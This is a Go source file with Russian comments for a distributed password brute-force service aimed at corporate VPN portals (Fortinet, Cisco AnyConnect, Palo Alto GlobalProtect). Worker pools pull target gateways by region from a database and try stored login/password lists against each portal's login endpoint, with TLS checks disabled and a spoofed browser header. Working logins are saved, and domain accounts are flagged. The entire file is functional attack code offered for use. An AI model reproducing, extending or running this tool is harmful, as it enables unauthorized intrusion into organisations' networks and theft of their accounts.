// vpn/brute/brute.go
package main

import (
	"context"
	"crypto/tls"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"strings"
	"sync"
	"time"

	_ "github.com/lib/pq"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promauto"
	"github.com/valyala/fasthttp"
)

// ============================================
// Prometheus метрики
// ============================================
var (
	bruteAttempts = promauto.NewCounterVec(
		prometheus.CounterOpts{
			Name: "brute_attempts_total",
			Help: "Total brute force attempts",
		},
		[]string{"geo", "protocol"},
	)

	bruteSuccess = promauto.NewCounterVec(
		prometheus.CounterOpts{
			Name: "brute_success_total",
			Help: "Total successful brute force attacks",
		},
		[]string{"geo", "protocol"},
	)

	bruteFailed = promauto.NewCounterVec(
		prometheus.CounterOpts{
			Name: "brute_failed_total",
			Help: "Total failed brute force attacks",
		},
		[]string{"geo", "protocol"},
	)

	bruteQueueSize = promauto.NewGaugeVec(
		prometheus.GaugeOpts{
			Name: "brute_queue_size",
			Help: "Current brute queue size",
		},
		[]string{"geo"},
	)

	bruteWorkersActive = promauto.NewGaugeVec(
		prometheus.GaugeOpts{
			Name: "brute_workers_active",
			Help: "Number of active brute workers",
		},
		[]string{"geo"},
	)
)

// ============================================
// Структуры
// ============================================
type BruteService struct {
	db         *sql.DB
	geo        string
	maxWorkers int
	queue      chan *VPN
	cooldown   map[string]time.Time
	cooldownMu sync.RWMutex
	credsCache map[string]*CredGroup // ✅ Исправлено: правильный тип
	credsMu    sync.RWMutex
	workers    int
	workersMu  sync.Mutex
	wg         sync.WaitGroup
}

type VPN struct {
	ID         string
	TargetURL  string
	Protocol   string
	DomainHint sql.NullString
	IP         sql.NullString // ✅ Добавлено
	Port       sql.NullInt32  // ✅ Добавлено
}

type CredGroup struct {
	ID        string
	Name      string
	Geo       string
	Priority  int
	Logins    []string
	Passwords []string
	Pairs     []CredPair
}

type CredPair struct {
	Login    string
	Password string
}

// ============================================
// Конструктор
// ============================================
func NewBruteService(db *sql.DB, geo string, maxWorkers int) *BruteService {
	return &BruteService{
		db:         db,
		geo:        geo,
		maxWorkers: maxWorkers,
		queue:      make(chan *VPN, 500), // ✅ Буфер для сглаживания
		cooldown:   make(map[string]time.Time),
		credsCache: make(map[string]*CredGroup),
		workers:    0,
	}
}

// ============================================
// Основной цикл
// ============================================
func (b *BruteService) Run(ctx context.Context) error {
	log.Printf("🚀 Starting brute service for GEO=%s (max workers: %d)", b.geo, b.maxWorkers)

	// Загружаем кредсы из БД
	if err := b.loadCredentials(); err != nil {
		log.Printf("⚠️ Failed to load credentials: %v", err)
	}

	// Запускаем фоновые процессы
	b.wg.Add(2)
	go b.fetchLoop(ctx)
	go b.metricsLoop(ctx)

	// Запускаем воркеры
	for i := 0; i < b.maxWorkers; i++ {
		b.startWorker(ctx, i)
	}

	<-ctx.Done()
	log.Printf("🛑 Shutting down brute service for GEO=%s", b.geo)
	close(b.queue)
	b.wg.Wait()

	return nil
}

// ============================================
// Загрузка credentials из БД
// ============================================
func (b *BruteService) loadCredentials() error {
	log.Printf("📋 Loading credentials for GEO=%s", b.geo)

	// Загружаем группы кредов
	query := `
		SELECT id, name, geo, priority 
		FROM cred_groups 
		WHERE geo = $1 
		ORDER BY priority DESC
	`

	rows, err := b.db.Query(query, b.geo)
	if err != nil {
		return fmt.Errorf("query cred_groups failed: %w", err)
	}
	defer rows.Close()

	for rows.Next() {
		var group CredGroup
		if err := rows.Scan(&group.ID, &group.Name, &group.Geo, &group.Priority); err != nil {
			log.Printf("⚠️ Scan error: %v", err)
			continue
		}

		// Загружаем логины для группы
		group.Logins, _ = b.loadGroupLogins(group.ID)

		// Загружаем пароли для группы
		group.Passwords, _ = b.loadGroupPasswords(group.ID)

		// Загружаем пары логин:пароль
		group.Pairs, _ = b.loadGroupPairs(group.ID)

		b.credsMu.Lock()
		b.credsCache[group.ID] = &group
		b.credsMu.Unlock()

		log.Printf("✅ Loaded cred group: %s (logins: %d, passwords: %d, pairs: %d)",
			group.Name, len(group.Logins), len(group.Passwords), len(group.Pairs))
	}

	return nil
}

func (b *BruteService) loadGroupLogins(groupID string) ([]string, error) {
	query := `
		SELECT l.value 
		FROM cred_group_logins cgl
		JOIN logins l ON cgl.login_id = l.id
		WHERE cgl.group_id = $1
	`

	rows, err := b.db.Query(query, groupID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var logins []string
	for rows.Next() {
		var login string
		if err := rows.Scan(&login); err != nil {
			continue
		}
		logins = append(logins, login)
	}

	return logins, nil
}

func (b *BruteService) loadGroupPasswords(groupID string) ([]string, error) {
	query := `
		SELECT p.value 
		FROM cred_group_passwords cgp
		JOIN passwords p ON cgp.password_id = p.id
		WHERE cgp.group_id = $1
	`

	rows, err := b.db.Query(query, groupID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var passwords []string
	for rows.Next() {
		var password string
		if err := rows.Scan(&password); err != nil {
			continue
		}
		passwords = append(passwords, password)
	}

	return passwords, nil
}

func (b *BruteService) loadGroupPairs(groupID string) ([]CredPair, error) {
	query := `
		SELECT l.value, p.value
		FROM cred_group_pairs cgp
		JOIN cred_pairs cp ON cgp.pair_id = cp.id
		JOIN logins l ON cp.login_id = l.id
		JOIN passwords p ON cp.password_id = p.id
		WHERE cgp.group_id = $1
	`

	rows, err := b.db.Query(query, groupID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var pairs []CredPair
	for rows.Next() {
		var pair CredPair
		if err := rows.Scan(&pair.Login, &pair.Password); err != nil {
			continue
		}
		pairs = append(pairs, pair)
	}

	return pairs, nil
}

// ============================================
// Получение VPN для брута
// ============================================
func (b *BruteService) fetchLoop(ctx context.Context) {
	defer b.wg.Done()

	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return

		case <-ticker.C:
			vpns, err := b.fetchVPNs(ctx)
			if err != nil {
				log.Printf("❌ Fetch VPNs: %v", err)
				continue
			}

			if len(vpns) == 0 {
				continue
			}

			for _, vpn := range vpns {
				select {
				case b.queue <- vpn:
					// Успешно добавлено
				case <-ctx.Done():
					return
				default:
					log.Printf("⚠️ Queue full, skipping VPN %s", vpn.ID)
				}
			}

			log.Printf("📥 Fetched %d VPNs for brute (GEO=%s)", len(vpns), b.geo)
		}
	}
}

func (b *BruteService) fetchVPNs(ctx context.Context) ([]*VPN, error) {
	// ✅ ИСПРАВЛЕНО: правильный SQL с FOR UPDATE SKIP LOCKED
	// ✅ Берём VPN со статусом 'new' (только что найденные) или 'brute_queued'
	query := `
		SELECT id, target_url, protocol, domain_hint, ip, port
		FROM vpns
		WHERE status IN ('new', 'brute_queued') 
		  AND geo = $1
		ORDER BY created_at ASC
		LIMIT 20
		FOR UPDATE SKIP LOCKED
	`

	rows, err := b.db.QueryContext(ctx, query, b.geo)
	if err != nil {
		return nil, fmt.Errorf("query failed: %w", err)
	}
	defer rows.Close()

	var vpns []*VPN
	for rows.Next() {
		var v VPN
		if err := rows.Scan(&v.ID, &v.TargetURL, &v.Protocol, &v.DomainHint, &v.IP, &v.Port); err != nil {
			log.Printf("⚠️ Scan error: %v", err)
			continue
		}

		// Обновляем статус на 'brute_running'
		if _, err := b.db.ExecContext(ctx, `
			UPDATE vpns 
			SET status = 'brute_running', updated_at = NOW() 
			WHERE id = $1
		`, v.ID); err != nil {
			log.Printf("⚠️ Failed to update VPN status: %v", err)
			continue
		}

		vpns = append(vpns, &v)
	}

	return vpns, nil
}

// ============================================
// Управление воркерами
// ============================================
func (b *BruteService) startWorker(ctx context.Context, workerID int) {
	b.workersMu.Lock()
	b.workers++
	b.workersMu.Unlock()

	b.wg.Add(1)
	go b.worker(ctx, workerID)
}

func (b *BruteService) worker(ctx context.Context, workerID int) {
	defer func() {
		b.workersMu.Lock()
		b.workers--
		b.workersMu.Unlock()
		b.wg.Done()
	}()

	// ✅ ИСПРАВЛЕНО: правильная настройка HTTP клиента
	client := &fasthttp.Client{
		ReadTimeout:         15 * time.Second,
		WriteTimeout:        15 * time.Second,
		MaxIdleConnDuration: 60 * time.Second,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	log.Printf("👷 Brute worker %d started (GEO=%s)", workerID, b.geo)

	for {
		select {
		case vpn, ok := <-b.queue:
			if !ok {
				log.Printf("👋 Brute worker %d stopping (queue closed)", workerID)
				return
			}

			// Проверяем cooldown
			b.cooldownMu.RLock()
			nextAttempt, hasCooldown := b.cooldown[vpn.ID]
			b.cooldownMu.RUnlock()

			if hasCooldown && time.Now().Before(nextAttempt) {
				// Ещё на cooldown - возвращаем в очередь
				waitTime := time.Until(nextAttempt)
				log.Printf("⏰ VPN %s on cooldown for %v", vpn.ID, waitTime)
				time.AfterFunc(waitTime, func() {
					select {
					case b.queue <- vpn:
					default:
						log.Printf("⚠️ Failed to re-queue VPN %s", vpn.ID)
					}
				})
				continue
			}

			// Выполняем брут
			success := b.bruteOne(client, vpn)

			// Устанавливаем cooldown
			cooldownDuration := 2 * time.Minute
			if success {
				cooldownDuration = 0 // Успех - больше не брутим
			}

			if cooldownDuration > 0 {
				b.cooldownMu.Lock()
				b.cooldown[vpn.ID] = time.Now().Add(cooldownDuration)
				b.cooldownMu.Unlock()
			}

		case <-ctx.Done():
			log.Printf("👋 Brute worker %d stopping (context cancelled)", workerID)
			return
		}
	}
}

// ============================================
// Брут одного VPN
// ============================================
func (b *BruteService) bruteOne(client *fasthttp.Client, vpn *VPN) bool {
	log.Printf("🔓 Starting brute for %s (%s)", vpn.TargetURL, vpn.Protocol)

	// Получаем кредсы для брута
	creds := b.getCredentialsForVPN(vpn)
	if len(creds) == 0 {
		log.Printf("⚠️ No credentials available for VPN %s", vpn.ID)
		b.markVPNFailed(vpn.ID, "no_credentials")
		return false
	}

	log.Printf("🔑 Trying %d credentials for %s", len(creds), vpn.TargetURL)

	// Пробуем каждую пару
	for i, cred := range creds {
		// Проверяем контекст
		select {
		case <-time.After(100 * time.Millisecond): // Rate limit
		default:
		}

		bruteAttempts.WithLabelValues(b.geo, vpn.Protocol).Inc()

		success := false
		var err error

		// Выбираем метод брута в зависимости от протокола
		switch vpn.Protocol {
		case "Fortinet":
			success, err = b.bruteFortinet(client, vpn, cred.Login, cred.Password)
		case "Cisco AnyConnect":
			success, err = b.bruteCisco(client, vpn, cred.Login, cred.Password)
		case "Palo Alto":
			success, err = b.brutePaloAlto(client, vpn, cred.Login, cred.Password)
		default:
			log.Printf("⚠️ Unsupported protocol: %s", vpn.Protocol)
			b.markVPNFailed(vpn.ID, "unsupported_protocol")
			return false
		}

		if err != nil {
			log.Printf("❌ [%d/%d] Error: %v", i+1, len(creds), err)
			continue
		}

		if success {
			bruteSuccess.WithLabelValues(b.geo, vpn.Protocol).Inc()
			log.Printf("✅ SUCCESS: %s with %s:%s", vpn.TargetURL, cred.Login, cred.Password)

			// Определяем тип аккаунта
			isDomain := b.isDomainAccount(cred.Login, vpn.DomainHint)

			// Сохраняем результат
			b.saveResult(vpn, cred.Login, cred.Password, isDomain)
			return true
		}

		log.Printf("❌ [%d/%d] Failed: %s:%s", i+1, len(creds), cred.Login, cred.Password)
	}

	// Все попытки неудачны
	bruteFailed.WithLabelValues(b.geo, vpn.Protocol).Inc()
	b.markVPNFailed(vpn.ID, "all_attempts_failed")
	return false
}

// ============================================
// Получение кредсов для VPN
// ============================================
func (b *BruteService) getCredentialsForVPN(vpn *VPN) []CredPair {
	var allCreds []CredPair

	b.credsMu.RLock()
	defer b.credsMu.RUnlock()

	// Сначала пары (более целевые)
	for _, group := range b.credsCache {
		allCreds = append(allCreds, group.Pairs...)
	}

	// Потом комбинации логин x пароль
	for _, group := range b.credsCache {
		for _, login := range group.Logins {
			for _, password := range group.Passwords {
				allCreds = append(allCreds, CredPair{
					Login:    login,
					Password: password,
				})
			}
		}
	}

	// Ограничиваем количество попыток
	maxAttempts := 100
	if len(allCreds) > maxAttempts {
		allCreds = allCreds[:maxAttempts]
	}

	return allCreds
}

// ============================================
// Методы брута для разных протоколов
// ============================================

func (b *BruteService) bruteFortinet(client *fasthttp.Client, vpn *VPN, username, password string) (bool, error) {
	// FortiGate SSL VPN login
	loginURL := vpn.TargetURL + "/remote/logincheck"

	// Формируем данные для логина
	realm := ""
	if vpn.DomainHint.Valid && vpn.DomainHint.String != "" {
		realm = vpn.DomainHint.String
	}

	formData := url.Values{}
	formData.Set("username", username)
	formData.Set("secretkey", password)
	if realm != "" {
		formData.Set("realm", realm)
	}
	formData.Set("ajax", "1")

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(loginURL)
	req.Header.SetMethod("POST")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
	req.SetBodyString(formData.Encode())

	err := client.DoTimeout(req, resp, 15*time.Second)
	if err != nil {
		return false, fmt.Errorf("request failed: %w", err)
	}

	body := string(resp.Body())
	statusCode := resp.StatusCode()

	// Проверяем успех
	// FortiGate возвращает JSON с "ret":1 при успехе
	if statusCode == 200 && strings.Contains(body, `"ret":1`) {
		return true, nil
	}

	// Проверяем ошибки аутентификации
	if strings.Contains(body, `"ret":0`) || strings.Contains(body, "invalid") {
		return false, nil // Неверные креды
	}

	return false, fmt.Errorf("unexpected response: status=%d", statusCode)
}

func (b *BruteService) bruteCisco(client *fasthttp.Client, vpn *VPN, username, password string) (bool, error) {
	// Cisco AnyConnect WebVPN login
	loginURL := vpn.TargetURL + "/+webvpn+/index.html"

	formData := url.Values{}
	formData.Set("username", username)
	formData.Set("password", password)
	formData.Set("group_list", "")

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(loginURL)
	req.Header.SetMethod("POST")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.SetBodyString(formData.Encode())

	err := client.DoTimeout(req, resp, 15*time.Second)
	if err != nil {
		return false, fmt.Errorf("request failed: %w", err)
	}

	statusCode := resp.StatusCode()
	body := string(resp.Body())

	// Успех: редирект или статус 302/200 без ошибки
	if statusCode == 302 || (statusCode == 200 && !strings.Contains(body, "error")) {
		return true, nil
	}

	return false, nil
}

func (b *BruteService) brutePaloAlto(client *fasthttp.Client, vpn *VPN, username, password string) (bool, error) {
	// Palo Alto GlobalProtect portal login
	loginURL := vpn.TargetURL + "/global-protect/login.esp"

	formData := url.Values{}
	formData.Set("user", username)
	formData.Set("passwd", password)

	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI(loginURL)
	req.Header.SetMethod("POST")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.SetBodyString(formData.Encode())

	err := client.DoTimeout(req, resp, 15*time.Second)
	if err != nil {
		return false, fmt.Errorf("request failed: %w", err)
	}

	body := string(resp.Body())

	// Успех: XML с authcookie
	if strings.Contains(body, "<authcookie>") {
		return true, nil
	}

	return false, nil
}

// ============================================
// Определение типа аккаунта
// ============================================
func (b *BruteService) isDomainAccount(login string, domainHint sql.NullString) bool {
	// Проверяем формат логина
	if strings.Contains(login, "@") || strings.Contains(login, "\\") {
		return true
	}

	// Проверяем domain hint
	if domainHint.Valid && domainHint.String != "" {
		domain := strings.ToUpper(domainHint.String)
		if domain != "LOCAL" && domain != "WORKGROUP" {
			return true
		}
	}

	return false
}

// ============================================
// Сохранение результатов
// ============================================
func (b *BruteService) saveResult(vpn *VPN, username, password string, isDomain bool) {
	// Сохраняем в brute_results
	query := `
		INSERT INTO brute_results (
			id, vpn_id, login, password, is_domain_account, found_at
		) VALUES (
			gen_random_uuid(), $1, $2, $3, $4, NOW()
		)
	`

	if _, err := b.db.Exec(query, vpn.ID, username, password, isDomain); err != nil {
		log.Printf("❌ Failed to save brute result: %v", err)
		return
	}

	// Обновляем статус VPN
	updateQuery := `
		UPDATE vpns 
		SET status = 'brute_success', updated_at = NOW()
		WHERE id = $1
	`

	if _, err := b.db.Exec(updateQuery, vpn.ID); err != nil {
		log.Printf("❌ Failed to update VPN status: %v", err)
	}

	log.Printf("💾 Saved brute result for VPN %s", vpn.ID)
}

func (b *BruteService) markVPNFailed(vpnID, reason string) {
	query := `
		UPDATE vpns 
		SET status = 'brute_failed', updated_at = NOW()
		WHERE id = $1
	`

	if _, err := b.db.Exec(query, vpnID); err != nil {
		log.Printf("❌ Failed to mark VPN as failed: %v", err)
	}

	log.Printf("⚠️ Marked VPN %s as brute_failed (reason: %s)", vpnID, reason)
}

// ============================================
// Метрики
// ============================================
func (b *BruteService) metricsLoop(ctx context.Context) {
	defer b.wg.Done()

	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return

		case <-ticker.C:
			qLen := len(b.queue)
			bruteQueueSize.WithLabelValues(b.geo).Set(float64(qLen))

			b.workersMu.Lock()
			workers := b.workers
			b.workersMu.Unlock()

			bruteWorkersActive.WithLabelValues(b.geo).Set(float64(workers))

			// Статистика из БД
			var queuedCount, runningCount, successCount int

			b.db.QueryRow(`
				SELECT COUNT(*) FROM vpns 
				WHERE geo = $1 AND status IN ('new', 'brute_queued')
			`, b.geo).Scan(&queuedCount)

			b.db.QueryRow(`
				SELECT COUNT(*) FROM vpns 
				WHERE geo = $1 AND status = 'brute_running'
			`, b.geo).Scan(&runningCount)

			b.db.QueryRow(`
				SELECT COUNT(*) FROM vpns 
				WHERE geo = $1 AND status = 'brute_success'
			`, b.geo).Scan(&successCount)

			log.Printf("📊 [%s] Queue: %d, Workers: %d, Queued: %d, Running: %d, Success: %d",
				b.geo, qLen, workers, queuedCount, runningCount, successCount)
		}
	}
}